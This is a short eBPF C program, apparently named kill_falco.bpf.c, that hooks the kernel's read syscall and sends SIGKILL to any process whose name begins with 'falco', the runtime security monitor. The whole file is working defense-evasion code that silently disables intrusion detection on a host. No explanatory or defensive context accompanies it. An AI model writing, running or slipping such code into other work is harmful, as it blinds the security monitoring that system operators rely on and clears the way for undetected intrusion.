// kill_falco.bpf.c
#include <linux/bpf.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>

SEC("kprobe/__x64_sys_read")
int kill_falco(struct pt_regs *ctx) {
    char comm[16];
    bpf_get_current_comm(&comm, sizeof(comm));

    if (comm[0]=='f' && comm[1]=='a' && comm[2]=='l' && comm[3]=='c' && comm[4]=='o') {
        bpf_send_signal(9); // SIGKILL
    }
    return 0;
}

char LICENSE[] SEC("license") = "GPL";


